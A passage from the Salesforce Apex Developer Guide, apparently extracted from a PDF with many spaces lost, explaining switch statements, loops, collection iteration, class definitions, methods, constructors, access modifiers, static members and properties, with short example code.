Note:  Salesforce recommends including a whenelse block, especially with enum types, although it isn’t required. When you
build a switch statement using enum values provided by a managed package, your code might not behave as expected if a
54
Control Flow StatementsApex Developer Guide

new version of the package contains additional enum values. You can prevent this problem by including a whenelse block
to handle unanticipated values.
If you include a whenelse block, it must be the last block in the switch statement.
Examples with Literals
You can use literal when values for switching on Integer, Long, and String types. String clauses are case-sensitive. For example, “orange”
is a different value than “ORANGE.”
Single Value Example
The following example uses integer literals for when values.
switchon i {
when2 {
System.debug('whenblock2');
}
when-3 {
System.debug('whenblock-3');
}
whenelse{
System.debug('default');
}
}
Null Value Example
Because all types in Apex are nullable, a when value can be null.
switchon i {
when2 {
System.debug('whenblock2');
}
whennull{
System.debug('badinteger');
}
whenelse{
System.debug('default' + i);
}
}
Multiple Values Examples
The Apex switch statement doesn’t fall-through, but a when clause can include multiple literal values to match against. You can
also nest Apex switch statements to provide multiple execution paths within a when clause.
switchon i {
when2, 3, 4 {
System.debug('whenblock2 and 3 and 4');
}
when5, 6 {
System.debug('whenblock5 and 6');
}
when7 {
System.debug('whenblock7');
}
55
Control Flow StatementsApex Developer Guide

whenelse{
System.debug('default');
}
}
Method Example
Instead of switching on a variable expression, the following example switches on the result of a method call.
switchon someInteger(i){
when2 {
System.debug('whenblock2');
}
when3 {
System.debug('whenblock3');
}
whenelse{
System.debug('default');
}
}
Example with sObjects
Switching on an sObject value allows you to implicitly perform instanceof checks and casting. For example, consider the following
code that uses if-else statements.
if (sobjectinstanceofAccount){
Accounta = (Account)sobject;
System.debug('account' + a);
} elseif (sobjectinstanceofContact){
Contactc = (Contact)sobject;
System.debug('contact' + c);
} else{
System.debug('default');
}
You can replace and simplify this code with the following switch statement.
switchon sobject{
whenAccounta {
System.debug('account' + a);
}
whenContactc {
System.debug('contact' + c);
}
whennull{
System.debug('null');
}
whenelse{
System.debug('default');
}
}
Note:  You can use only one sObject type per when block.
56
Control Flow StatementsApex Developer Guide

Example with Enums
A switch statement that uses enum when values doesn’t require a whenelse block, but it is recommended. You can use multiple
enum values per when block clause.
switchon season{
whenWINTER{
System.debug('boots');
}
whenSPRING,SUMMER{
System.debug('sandals');
}
whenelse{
System.debug('noneof the above');
}
}
Loops
Apex supports five types of procedural loops.
These types of procedural loops are supported:
•
do {statement} while(Boolean_condition);
•
while(Boolean_condition)statement;
•
for (initialization;Boolean_exit_condition;increment)statement;
•
for (variable:array_or_set)statement;
•
for (variable: [inline_soql_query])statement;
All loops allow for loop control structures:
•
break; exits the entire loop
•
continue; skips to the next iteration of the loop
1.Do-While Loops
2.While Loops
3.For Loops
Do-While Loops
The Apex do-while loop repeatedly executes a block of code as long as a particular Boolean condition remains true. Its syntax is:
do {
code_block
} while(condition);
Note:  Curly braces ({}) are always required around a code_block.
As in Java, the Apex do-while loop does not check the Boolean condition statement until after the first loop is executed. Consequently,
the code block always runs at least once.
57
Control Flow StatementsApex Developer Guide

As an example, the following code outputs the numbers 1 - 10 into the debug log:
Integercount= 1;
do {
System.debug(count);
count++;
} while(count< 11);
While Loops
The Apex while loop repeatedly executes a block of code as long as a particular Boolean condition remains true. Its syntax is:
while(condition){
code_block
}
Note:  Curly braces ({}) are required around a code_block only if the block contains more than one statement.
Unlike do-while, the while loop checks the Boolean condition statement before the first loop is executed. Consequently, it is
possible for the code block to never execute.
As an example, the following code outputs the numbers 1 - 10 into the debug log:
Integercount= 1;
while(count< 11) {
System.debug(count);
count++;
}
For Loops
Apex supports three variations of the for loop:
•
The traditional for loop:
for (init_stmt;exit_condition;increment_stmt) {
code_block
}
•
The list or set iteration for loop:
for (variable:list_or_set) {
code_block
}
where variable must be of the same primitive or sObject type as list_or_set.
•
The SOQL for loop:
for (variable: [soql_query]) {
code_block
}
58
Control Flow StatementsApex Developer Guide

or
for (variable_list: [soql_query]) {
code_block
}
Both variable and variable_list must be of the same sObject type as is returned by the soql_query.
Note:  Curly braces ({}) are required around a code_block only if the block contains more than one statement.
Each is discussed further in the sections that follow.
Traditional For Loops
List or Set Iteration for Loops
Iterating Collections
Traditional For Loops
The traditional for loop in Apex corresponds to the traditional syntax used in Java and other languages. Its syntax is:
for (init_stmt;exit_condition;increment_stmt) {
code_block
}
When executing this type of for loop, the Apex runtime engine performs the following steps, in order:
1.Execute the init_stmt component of the loop. Note that multiple variables can be declared and/or initialized in this statement,
separated by commas.
2.Perform the exit_condition check. If true, the loop continues. If false, the loop exits.
3.Execute the code_block.
4.Execute the increment_stmt statement.
5.Return to Step 2.
As an example, the following code outputs the numbers 1 - 10 into the debug log. Note that an additional initialization variable, j, is
included to demonstrate the syntax:
for (Integeri = 0, j = 0; i < 10; i++){
System.debug(i+1);
}
List or Set Iteration for Loops
The list or set iteration for loop iterates over all the elements in a list or set. Its syntax is:
for (variable:list_or_set) {
code_block
}
where variable must be of the same primitive or sObject type as list_or_set.
When executing this type of for loop, the Apex runtime engine assigns variable to each element in list_or_set, and
runs the code_block for each value.
59
Control Flow StatementsApex Developer Guide

For example, the following code outputs the numbers 1 - 10 to the debug log:
Integer[] myInts= new Integer[]{1,2, 3, 4, 5, 6, 7, 8, 9, 10};
for (Integeri : myInts){
System.debug(i);
}
Iterating Collections
Collections can consist of lists, sets, or maps. Modifying a collection's elements while iterating through that collection is not supported
and causes an error. Do not directly add or remove elements while iterating through the collection that includes them.
Adding Elements During Iteration
To add elements while iterating a list, set or map, keep the new elements in a temporary list, set, or map and add them to the original
after you finish iterating the collection.
Removing Elements During Iteration
To remove elements while iterating a list, create a new list, then copy the elements you wish to keep. Alternatively, add the elements
you wish to remove to a temporary list and remove them after you finish iterating the collection.
Note: The List.remove method performs linearly. Using it to remove elements has time and resource implications.
To remove elements while iterating a map or set, keep the keys you wish to remove in a temporary list, then remove them after you
finish iterating the collection.
Classes, Objects, and Interfaces
Apex classes are modeled on their counterparts in Java. You’ll define, instantiate, and extend classes, and you’ll work with interfaces,
Apex class versions, properties, and other related class concepts.
1.Classes
As in Java, you can create classes in Apex. A class is a template or blueprint from which objects are created. An object is an instance
of a class.
2.Interfaces
An interface is like a class in which none of the methods have been implemented—the method signatures are there, but the body
of each method is empty. To use an interface, another class must implement it by providing a body for all of the methods contained
in the interface.
3.Keywords
Apex provides the keywords final, instanceof, super, this, transient, withsharing and without
sharing.
4.Annotations
An Apex annotation modifies the way that a method or class is used, similar to annotations in Java. Annotations are defined with
an initial @ symbol, followed by the appropriate keyword.
60
Classes, Objects, and InterfacesApex Developer Guide

5.Classes and Casting
In general, all type information is available at run time. This means that Apex enables casting, that is, a data type of one class can be
assigned to a data type of another class, but only if one class is a subclass of the other class. Use casting when you want to convert
an object from one data type to another.
6.Differences Between Apex Classes and Java Classes
Apex classes and Java classes work in similar ways, but there are some significant differences.
7.Class Definition Creation
Use the class editor to create a class in Salesforce.
8.Namespace Prefix
The Salesforce application supports the use of namespace prefixes. Namespace prefixes are used in managed AppExchange packages
to differentiate custom object and field names from names used by other organizations.
9.Apex Code Versions
To aid backwards-compatibility, classes and triggers are stored with the version settings for a specific Salesforce API version.
10.Lists of Custom Types and Sorting
Lists can hold objects of your user-defined types (your Apex classes). Lists of user-defined types can be sorted.
11.Using Custom Types in Map Keys and Sets
You can add instances of your own Apex classes to maps and sets.
Classes
As in Java, you can create classes in Apex. A class is a template or blueprint from which objects are created. An object is an instance of a
class.
For example, the PurchaseOrder class describes an entire purchase order, and everything that you can do with a purchase order.
An instance of the PurchaseOrder class is a specific purchase order that you send or receive.
All objects have state and behavior, that is, things that an object knows about itself, and things that an object can do. The state of a
PurchaseOrder object—what it knows—includes the user who sent it, the date and time it was created, and whether it was flagged as
important. The behavior of a PurchaseOrder object—what it can do—includes checking inventory, shipping a product, or notifying a
customer.
A class can contain variables and methods. Variables are used to specify the state of an object, such as the object's Name or Type.
Since these variables are associated with a class and are members of it, they are commonly referred to as member variables. Methods
are used to control behavior, such as getOtherQuotes or copyLineItems.
A class can contain other classes, exception types, and initialization code.
An interface is like a class in which none of the methods have been implemented—the method signatures are there, but the body of
each method is empty. To use an interface, another class must implement it by providing a body for all of the methods contained in the
interface.
For more general information on classes, objects, and interfaces, see http://java.sun.com/docs/books/tutorial/java/concepts/index.html
In addition to classes, Apex provides triggers, similar to database triggers. A trigger is Apex code that executes before or after database
operations. See Triggers.
1.Apex Class Definition
2.Class Variables
61
Classes, Objects, and InterfacesApex Developer Guide

3.Class Methods
Learn how to define Apex methods. Understand the differences between passing method arguments by value and passing method
arguments by reference.
4.Using Constructors
5.Access Modifiers
6.Static and Instance Methods, Variables, and Initialization Code
In Apex, you can have static methods, variables, and initialization code. However, Apex classes can't be static. You can also have
instance methods, member variables, and initialization code, which have no modifiers, and local variables.
7.Apex Properties
8.Extending a Class
You can extend a class to provide more specialized behavior.
9.Extended Class Example
Apex Class Definition
In Apex, you can define top-level classes (also called outer classes) as well as inner classes, that is, a class defined within another class.
You can only have inner classes one level deep. For example:
publicclassmyOuterClass{
// AdditionalmyOuterClasscodehere
classmyInnerClass{
// myInnerClasscodehere
}
}
To define a class, specify the following:
1.Access modifiers:
•
You must use one of the access modifiers (such as public or global) in the declaration of a top-level class.
•
You don’t have to use an access modifier in the declaration of an inner class.
2.Optional definition modifiers (such as virtual, abstract, and so on)
3.Required: The keyword class followed by the name of the class
4.Optional extensions or implementations or both
Note:  Avoid using standard object names for class names. Doing so causes unexpected results. For a list of standard objects, see
Object Reference for Salesforce.
Use the following syntax for defining classes:
private| public| global
[virtual| abstract| withsharing| withoutsharing]
classClassName[implementsInterfaceNameList] [extendsClassName]
{
// The bodyof the class
}
•
The private access modifier declares that this class is only known locally, that is, only by this section of code. This is the default
access for inner classes—that is, if you don't specify an access modifier for an inner class, it’s considered private. This keyword
can only be used with inner classes (or with top-level test classes marked with the @IsTest annotation).
62
Classes, Objects, and InterfacesApex Developer Guide

•
The public access modifier declares that this class is visible in your application or namespace.
•
The global access modifier declares that this class is known by all Apex code everywhere. All classes containing methods defined
with the webservice keyword must be declared as global. If a method or inner class is declared as global, the outer,
top-level class must also be defined as global.
•
The withsharing and withoutsharing keywords specify the sharing mode for this class. For more information, see
Use the with sharing, without sharing, and inherited sharing Keywords on page 89.
•
The virtual definition modifier declares that this class allows extension and overrides. You can’t override a method with the
override keyword unless the class has been defined as virtual.
•
The abstract definition modifier declares that this class contains abstract methods, that is, methods that only have their signature
declared and no body defined.
Note:
•
You can’t add an abstract method to a global class after the class has been uploaded in a Managed - Released package version.
•
If the class in the Managed - Released package is virtual, the method that you can add to it must also be virtual and must have
an implementation.
•
You can’t override a public or protected virtual method of a global class of an installed managed package.
For more information about managed packages, see What is a Package? on page 742.
A class can implement multiple interfaces, but only extend one existing class. This restriction means that Apex doesn’t support multiple
inheritance. The interface names in the list are separated by commas. For more information about interfaces, see Interfaces on page 81.
For more information about method and variable access modifiers, see Access Modifiers on page 68.
Versioned Behavior Changes
In API version 65.0 and later, an abstract or override method requires a protected, public, or global access modifier. If one of
these access modifiers isn’t explicitly included in the method declaration, then method access defaults to private. Private access is
invalid for these method types because the implementing class can’t access the abstract method. Therefore, if you attempt to declare
an abstract or override method without an allowed access modifier, you get the compilation error Abstractmethodsrequire
at leastone of the following:global, public, protected.
In API version 61.0 and later, private methods are no longer overridden by an instance method with the same signature in a subclass.
This change is versioned, so to prevent the override, update your abstract or virtual classes that contain private methods to API version
61.0 or later. In API version 60.0 and earlier, if a subclass declares an instance method with the same signature as a private method in
one of its superclasses, the subclass method overrides the private method.
SEE ALSO:
Documentation Typographical Conventions
Salesforce Help: Manage Apex Classes
Salesforce Help: Developer Console Functionality
Class Variables
To declare a variable, specify the following:
•
Optional: Modifiers, such as public or final, as well as static.
•
Required: The data type of the variable, such as String or Boolean.
•
Required: The name of the variable.
63
Classes, Objects, and InterfacesApex Developer Guide

•
Optional: The value of the variable.
Use the following syntax when defining a variable:
[public| private| protected| global] [final] [static]data_typevariable_name
[=value]
For example:
privatestaticfinalIntegerMY_INT;
privatefinalIntegeri = 1;
Versioned Behavior Changes
In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
annotated with @namespaceAccessible. For accessibility considerations, see NamespaceAccessible Annotation. For more
information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.
Class Methods
Learn how to define Apex methods. Understand the differences between passing method arguments by value and passing method
arguments by reference.
Apex methods are comprised of these elements.
•
Optional: Modifiers, such as public or protected.
•
Required: The data type of the value returned by the method, such as String or Integer. Use void if the method doesn’t return a
value.
•
Required: A list of input parameters for the method, separated by commas, each preceded by its data type, and enclosed in parentheses
(). If there are no parameters, use a set of empty parentheses. A method can only have 32 input parameters.
•
Required: The body of the method, enclosed in braces {}. All the code for the method, including any local variable declarations, is
contained here.
Note:  All Apex types implement the Object class methods.
To define a method, use this syntax.
[public| private| protected| global] [override] [static]data_typemethod_name(input
parameters) {
// The bodyof the method
}
Note:  You can use override to override methods only in classes that have been defined as virtual or abstract.
This method has the correct syntax.:
publicstaticIntegergetInt(){
returnMY_INT;
}
As in Java, methods that return values can also be run as a statement if their results aren’t assigned to another variable.
User-defined methods:
•
Can be used anywhere that system methods are used.
•
Can be recursive.
64
Classes, Objects, and InterfacesApex Developer Guide

•
Can have side effects, such as DML insert statements that initialize sObject record IDs. See Apex DML Statements.
•
Can refer to themselves or to methods defined later in the same class or anonymous block. Apex parses methods in two phases, so
forward declarations aren’t needed.
•
Can be overloaded. For example, a method named example can be implemented in two ways, one with a single Integer parameter
and one with two Integer parameters. Depending on whether the method is called with one or two Integers, the Apex parser selects
the appropriate implementation to execute. If the parser can’t find an exact match, it then seeks an approximate match using type
coercion rules. For more information on data conversion, see Rules of Conversion on page 51.
Note:  If the parser finds multiple approximate matches, a parse-time exception is generated.
•
Methods with a void return type are typically invoked as a standalone statement in Apex code. For example:
System.debug('Hereis a notefor the log.');
•
Can have statements where the return values are run as a statement if their results aren’t assigned to another variable. This rule is
the same in Java.
Note:  All user-defined types support the clone method. The clone() method in Apex is based on the clone method in
Java.
Passing Method Arguments by Value
In Apex, primitive data type arguments, such as Integer or String, are passed into methods by value. This fact means that any changes
to the arguments exist only within the scope of the method. When the method returns, the changes to the arguments are lost.
Non-primitive data type arguments, such as sObjects, are passed into methods by reference. Therefore, when the method returns, the
passed-in argument still references the same object as before the method call. Within the method, the reference can't be changed to
point to another object but the values of the object's fields can be changed.
These examples demonstrate the differences between passing primitive and non-primitive data type arguments into methods.
Example: Passing Primitive Data Type Arguments
This example shows how a primitive argument of type String is passed by value into another method. The debugStatusMessage
method in this example creates a String variable, msg, and assigns it a value. It then passes this variable as an argument to another
method, which modifies the value of this String. However, because String is a primitive type, it’s passed by value, and when the method
returns, the value of the original variable, msg, is unchanged. An assert statement verifies that the value of msg is still the old value.
publicclassPassPrimitiveTypeExample{
publicstaticvoiddebugStatusMessage(){
Stringmsg = 'Originalvalue';
processString(msg);
// The valueof the msg variabledidn't
// change;it is stillthe old value.
System.assertEquals(msg,'Originalvalue');
}
publicstaticvoidprocessString(Strings) {
s = 'Modifiedvalue';
}
}
Example: Passing Non-Primitive Data Type Arguments
This example shows how a List argument is passed by reference into the reference() method and is modified. It then shows, in
the referenceNew() method, that the List argument can't be changed to point to another List object.
65
Classes, Objects, and InterfacesApex Developer Guide

First, the createTemperatureHistory method creates a variable, fillMe, that is a List of Integers and passes it to a method.
The called method fills this list with Integer values representing rounded temperature values. When the method returns, an assert
statement verifies that the contents of the original List variable has changed and now contains five values. Next, the example creates a
second List variable, createMe, and passes it to another method. The called method assigns the passed-in argument to a newly
created List that contains new Integer values. When the method returns, the original createMe variable doesn't point to the new
List but still points to the original List, which is empty. An assert statement verifies that createMe contains no values.
publicclassPassNonPrimitiveTypeExample{
publicstaticvoidcreateTemperatureHistory(){
List<Integer> fillMe= new List<Integer>();
reference(fillMe);
// The listis modifiedand containsfiveitems
// as expected.
System.assertEquals(fillMe.size(),5);
List<Integer> createMe= new List<Integer>();
referenceNew(createMe);
// The listis not modifiedbecauseit stillpoints
// to the originallist,not the new list
// thatthe methodcreated.
System.assertEquals(createMe.size(),0);
}
publicstaticvoidreference(List<Integer> m) {
// Add roundedtemperaturesfor the lastfivedays.
m.add(70);
m.add(68);
m.add(75);
m.add(80);
m.add(82);
}
publicstaticvoidreferenceNew(List<Integer> m) {
// Assignargumentto a new Listof
// fivetemperaturevalues.
m = new List<Integer>{55,59, 62, 60, 63};
}
}
Versioned Behavior Changes
In API version 65.0 and later, an abstract or override method requires a protected, public, or global access modifier. If one of
these access modifiers isn’t explicitly included in the method declaration, then method access defaults to private. Private access is
invalid for these method types because the implementing class can’t access the abstract method. Therefore, if you attempt to declare
an abstract or override method without an allowed access modifier, you get the compilation error Abstractmethodsrequire
at leastone of the following:global, public, protected.
66
Classes, Objects, and InterfacesApex Developer Guide

In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
annotated with @namespaceAccessible. For accessibility considerations, see NamespaceAccessible Annotation. For more
information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.
SEE ALSO:
Primitive Data Types
Using Constructors
A constructor is code that is invoked when an object is created from the class blueprint. You do not need to write a constructor for every
class. If a class doesn't have a user-defined constructor, a default, no-argument constructor with the same visibility as the containing
class is generated.
The syntax for a constructor is similar to a method, but it differs from a method definition in that it never has an explicit return type and
it is not inherited by the object created from it.
After you write the constructor for a class, you must use the new keyword in order to instantiate an object from that class, using that
constructor. For example, using the following class:
publicclassTestObject{
// The no argumentconstructor
publicTestObject(){
// morecodehere
}
}
A new object of this type can be instantiated with this code.
TestObjectmyTest= new TestObject();
If you write a constructor that takes arguments, you can then use that constructor to create an object using those arguments.
If you create a constructor that takes arguments, and you still want to use a no-argument constructor, you must create your own
no-argument constructor in your code. After you create a constructor for a class, you no longer have access to the default, no-argument
public constructor.
In Apex, a constructor can be overloaded, that is, there can be more than one constructor for a class, each having different parameters.
This example illustrates a class with two constructors: one with no arguments and one that takes a simple Integer argument. It also
illustrates how one constructor calls another constructor using the this(...) syntax, also know as constructor chaining.
publicclassTestObject2{
privatestaticfinalIntegerDEFAULT_SIZE= 10;
Integersize;
//Constructorwithno arguments
publicTestObject2(){
this(DEFAULT_SIZE);// Usingthis(...)callsthe one argumentconstructor
}
// Constructorwithone argument
publicTestObject2(IntegerObjectSize){
size= ObjectSize;
67
Classes, Objects, and InterfacesApex Developer Guide

}
}
New objects of this type can be instantiated with this code.
TestObject2myObject1= new TestObject2(42);
TestObject2myObject2= new TestObject2();
Every constructor that you create for a class must have a different argument list. In this example, all of the constructors are possible.
publicclassLeads{
// Firsta no-argumentconstructor
publicLeads() {}
// A constructorwithone argument
publicLeads(Booleancall){}
// A constructorwithtwo arguments
publicLeads(Stringemail,Booleancall){}
// Thoughthisconstructorhas the sameargumentsas the
// one above,theyare in a differentorder,so thisis legal
publicLeads(Booleancall,Stringemail){}
}
When you define a new class, you are defining a new data type. You can use class name in any place you can use other data type names,
such as String, Boolean, or Account. If you define a variable whose type is a class, any object you assign to it must be an instance of that
class or subclass.
Access Modifiers
Apex allows you to use the private, protected, public, and global access modifiers when defining methods and variables.
While triggers and anonymous blocks can also use these access modifiers, they aren’t as useful in smaller portions of Apex. For example,
declaring a method as global in an anonymous block doesn’t enable you to call it from outside of that code.
For more information on class access modifiers, see Apex Class Definition on page 62.
Note:  Methods defined in an interface have the same access modifier as the interface (public or global). For more information,
see Interfaces.
By default, a method or variable is visible only to the Apex code within the defining class. Explicitly specify a method or variable as public
in order for it to be available to other classes in the same application namespace (see Namespace Prefix). You can change the level of
visibility by using the following access modifiers:
private
This access modifier is the default, and means that the method or variable is accessible only within the Apex class in which it’s defined.
If you don’t specify an access modifier, the method or variable is private.
protected
This means that the method or variable is visible to any inner classes in the defining Apex class, and to the classes that extend the
defining Apex class. You can only use this access modifier for instance methods and member variables. This setting is strictly more
permissive than the default (private) setting, just like Java.
68
Classes, Objects, and InterfacesApex Developer Guide

public
This means that the method or variable is accessible by all Apex within a specific package. For accessibility by all second-generation
(2GP) managed packages that share a namespace, use public with the @NamespaceAccessible annotation. Using the
public access modifier in no-namespace packages implicitly renders the Apex code as @NamespaceAccessible.
Note:  In Apex, the public access modifier isn’t the same as it is in Java. This was done to discourage joining applications,
to keep the code for each application separate. In Apex, if you want to make something public like it is in Java, you must use
the global access modifier.
For more information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.
global
This means the method or variable can be used by any Apex code that has access to the class, not just the Apex code in the same
application. This access modifier must be used for any method that must be referenced outside of the application, either in SOAP
API or by other Apex code. If you declare a method or variable as global, you must also declare the class that contains it as
global.
Note:  We recommend using the global access modifier rarely, if at all. Cross-application dependencies are difficult to
maintain.
To use the private, protected, public, or global access modifiers, use the following syntax:
[(none)|private|protected|public|global]declaration
For example:
// privatevariables1
privatestrings1 = '1';
// publicmethodgetsz()
publicstringgetsz(){
...
}
Versioned Behavior Changes
In API version 65.0 and later, an abstract or override method requires a protected, public, or global access modifier. If one of
these access modifiers isn’t explicitly included in the method declaration, then method access defaults to private. Private access is
invalid for these method types because the implementing class can’t access the abstract method. Therefore, if you attempt to declare
an abstract or override method without an allowed access modifier, you get the compilation error Abstractmethodsrequire
at leastone of the following:global, public, protected.
Static and Instance Methods, Variables, and Initialization Code
In Apex, you can have static methods, variables, and initialization code. However, Apex classes can't be static. You can also have instance
methods, member variables, and initialization code, which have no modifiers, and local variables.
Characteristics
Static methods, variables, and initialization code have these characteristics.
•
They’re associated with a class.
•
They’re allowed only in outer classes.
•
They’re initialized only when a class is loaded.
69
Classes, Objects, and InterfacesApex Developer Guide

•
They aren’t transmitted as part of the view state for a Visualforce page.
Instance methods, member variables, and initialization code have these characteristics.
•
They’re associated with a particular object.
•
They have no definition modifier.
•
They’re created with every object instantiated from the class in which they’re declared.
Local variables have these characteristics.
•
They’re associated with the block of code in which they’re declared.
•
They must be initialized before they’re used.
The following example shows a local variable whose scope is the duration of the if code block.
BooleanmyCondition= true;
if (myCondition){
integerlocalVariable= 10;
}
Using Static Methods and Variables
You can use static methods and variables only with outer classes. Inner classes have no static methods or variables. A static method or
variable doesn’t require an instance of the class in order to run.
Before an object of a class is created, all static member variables in a class are initialized, and all static initialization code blocks are
executed. These items are handled in the order in which they appear in the class.
A static method is used as a utility method, and it never depends on the value of an instance member variable. Because a static method
is only associated with a class, it can’t access the instance member variable values of its class.
A static variable is static only within the scope of the Apex transaction. It’s not static across the server or the entire organization. The
value of a static variable persists within the context of a single transaction and is reset across transaction boundaries. For example, if an
Apex DML request causes a trigger to fire multiple times, the static variables persist across these trigger invocations.
To store information that is shared across instances of a class, use a static variable. All instances of the same class share a single copy of
the static variable. For example, all triggers that a single transaction spawns can communicate with each other by viewing and updating
static variables in a related class. A recursive trigger can use the value of a class variable to determine when to exit the recursion.
Suppose that you had the following class.
publicclassP {
publicstaticbooleanfirstRun= true;
}
A trigger that uses this class could then selectively fail the first run of the trigger.
triggerT1 on Account(beforedelete, afterdelete, afterundelete) {
if(Trigger.isBefore){
if(Trigger.isDelete){
if(p.firstRun){
Trigger.old[0].addError('BeforeAccountDeleteError');
p.firstRun=false;
}
}
}
}
70
Classes, Objects, and InterfacesApex Developer Guide

A static variable defined in a trigger doesn't retain its value between different trigger contexts within the same transaction, such as
between before insert and after insert invocations. Instead, define the static variables in a class so that the trigger can access these class
member variables and check their static values.
A class static variable can’t be accessed through an instance of that class. If class MyClass has a static variable myStaticVariable,
and myClassInstance is an instance of MyClass, myClassInstance.myStaticVariable isn’t a legal expression.
The same is true for instance methods. If myStaticMethod() is a static method, myClassInstance.myStaticMethod()
isn’t legal. Instead, refer to those static identifiers using the class: MyClass.myStaticVariable and
MyClass.myStaticMethod().
Local variable names are evaluated before class names. If a local variable has the same name as a class, the local variable hides methods
and variables on the class of the same name. For example, this method works if you comment out the String line. But if the String
line is included the method doesn’t compile, because Salesforce reports that the method doesn’t exist or has an incorrect signature.
publicstaticvoidmethod(){
StringDatabase= '';
Database.insert(new Account());
}
An inner class behaves like a static Java inner class, but doesn’t require the static keyword. An inner class can have instance member
variables like an outer class, but there’s no implicit pointer to an instance of the outer class (using the this keyword).
Note:  In API version 20.0 and earlier, if a Bulk API request causes a trigger to fire, each chunk of 200 records for the trigger to
process is split into chunks of 100 records. In Salesforce API version 21.0 and later, no further splits of API chunks occur. If a Bulk
API request causes a trigger to fire multiple times for chunks of 200 records, governor limits are reset between these trigger
invocations for the same HTTP request. Static variables aren’t reset within the multiple trigger invocations for the same Bulk API
request.
Using Instance Methods and Variables
Instance methods and member variables are used by an instance of a class, that is, by an object. An instance member variable is declared
inside a class, but not within a method. Instance methods usually use instance member variables to affect the behavior of the method.
Suppose that you want to have a class that collects two-dimensional points and plots them on a graph. The following skeleton class
uses member variables to hold the list of points and an inner class to manage the two-dimensional list of points.
publicclassPlotter{
// Thisinnerclassmanagesthe points
classPoint{
Doublex;
Doubley;
Point(Doublex, Doubley) {
this.x = x;
this.y = y;
}
DoublegetXCoordinate(){
returnx;
}
DoublegetYCoordinate(){
returny;
}
}
71
Classes, Objects, and InterfacesApex Developer Guide

List<Point>points= new List<Point>();
publicvoidplot(Doublex, Doubley) {
points.add(new Point(x,y));
}
// The followingmethodtakesthe listof pointsand doessomethingwiththem
publicvoidrender(){
}
}
Using Initialization Code
Instance initialization code is a block of code in the following form that is defined in a class.
{
//codebody
}
The instance initialization code in a class is executed each time an object is instantiated from that class. These code blocks run before
the constructor.
If you don’t want to write your own constructor for a class, you can use an instance initialization code block to initialize instance variables.
In simple situations, use an ordinary initializer. Reserve initialization code for complex situations, such as initializing a static map. A static
initialization block runs only one time, regardless of how many times you access the class that contains it.
Static initialization code is a block of code preceded with the keyword static.
static{
//codebody
}
Similar to other static code, a static initialization code block is only initialized one time on the first use of the class.
A class can have any number of either static or instance initialization code blocks. They can appear anywhere in the code body. The code
blocks are executed in the order in which they appear in the file, just as they are in Java.
You can use static initialization code to initialize static final variables and to declare information that’s static, such as a map of values. For
example:
publicclassMyClass{
classRGB {
Integerred;
Integergreen;
Integerblue;
RGB(Integerred,Integergreen,Integerblue){
this.red= red;
this.green= green;
this.blue= blue;
72
Classes, Objects, and InterfacesApex Developer Guide

}
}
staticMap<String, RGB>colorMap= new Map<String, RGB>();
static{
colorMap.put('red', new RGB(255,0, 0));
colorMap.put('cyan', new RGB(0,255,255));
colorMap.put('magenta', new RGB(255,0, 255));
}
}
Versioned Behavior Changes
In API version 50.0 and later, scope and accessibility rules are enforced on Apex variables, methods, inner classes, and interfaces that are
annotated with @namespaceAccessible. For accessibility considerations, see NamespaceAccessible Annotation. For more
information on namespace-based visibility, see Namespace-Based Visibility for Apex Classes in Second-Generation Packages.
Apex Properties
An Apex property is similar to a variable; however, you can do additional things in your code to a property value before it’s accessed or
returned. Properties can be used to validate data before a change is made, to prompt an action when data is changed (such as altering
the value of other member variables), or to expose data that is retrieved from some other source (such as another class).
Property definitions include one or two code blocks, representing a get accessor and a set accessor:
•
The code in a get accessor executes when the property is read.
•
The code in a set accessor executes when the property is assigned a new value.
If a property has only a get accessor, it’s considered read-only. If a property has only a set accessor, it’s considered write-only. A property
with both accessors is considered read-write.
To declare a property, use the following syntax in the body of a class:
PublicclassBasicClass{
// Propertydeclaration
access_modifierreturn_typeproperty_name{
get {
//Getaccessorcodeblock
}
set {
//Setaccessorcodeblock
}
}
}
Where:
•
access_modifier is the access modifier for the property. The access modifiers that can be applied to properties include:
public, private, global, and protected. In addition, these definition modifiers can be applied: static and
transient. For more information on access modifiers, see Access Modifiers on page 68.
•
return_type is the type of the property, such as Integer, Double, sObject, and so on. For more information, see Data Types on
page 24.
•
property_name is the name of the property
73
Classes, Objects, and InterfacesApex Developer Guide

For example, the following class defines a property named prop. The property is public. The property returns an integer data type.
publicclassBasicProperty{
publicintegerprop{
get { returnprop;}
set { prop= value;}
}
}
The following code segment calls the BasicProperty class, exercising the get and set accessors:
BasicPropertybp = new BasicProperty();
bp.prop= 5;// Callsset accessor
System.assertEquals(5,bp.prop);// Callsget accessor
Note the following:
•
The body of the get accessor is similar to that of a method. It must return a value of the property type. Executing the get accessor is
the same as reading the value of the variable.
•
The get accessor must end in a return statement.
•
We recommend that your get accessor not change the state of the object that it’s defined on.
•
The set accessor is similar to a method whose return type is void.
•
When you assign a value to the property, the set accessor is invoked with an argument that provides the new value.
•
In API version 42.0 and later, unless a variable value is set in a set accessor, you can’t update its value in a get accessor.
•
When the set accessor is invoked, the system passes an implicit argument to the setter called value of the same data type as the
property.
•
Properties can’t be defined on interface.
•
Apex properties are based on their counterparts in C#, with the following differences:
–
Properties provide storage for values directly. You don’t need to create supporting members for storing values.
–
It’s possible to create automatic properties in Apex. For more information, see Using Automatic Properties on page 74.
Using Automatic Properties
Properties don’t require additional code in their get or set accessor code blocks. Instead, you can leave get and set accessor code blocks
empty to define an automatic property. Automatic properties allow you to write more compact code that is easier to debug and maintain.
They can be declared as read-only, read-write, or write-only. The following example creates three automatic properties:
publicclassAutomaticProperty{
publicintegerMyReadOnlyProp{ get;}
publicdoubleMyReadWriteProp{ get;set;}
publicstringMyWriteOnlyProp{ set;}
}
The following code segment exercises these properties:
AutomaticPropertyap = new AutomaticProperty();
ap.MyReadOnlyProp= 5;// Thisproducesa compileerror:not writable
ap.MyReadWriteProp= 5;// No error
System.assertEquals(5,ap.MyWriteOnlyProp);// Thisproducesa compileerror:not readable
74
Classes, Objects, and InterfacesApex Developer Guide

Using Static Properties
When a property is declared as static, the property's accessor methods execute in a static context. Therefore, accessors don’t have
access to non-static member variables defined in the class. The following example creates a class with both static and instance properties:
publicclassStaticProperty{
privatestaticintegerStaticMember;
privateintegerNonStaticMember;
// The followingproducesa systemerror
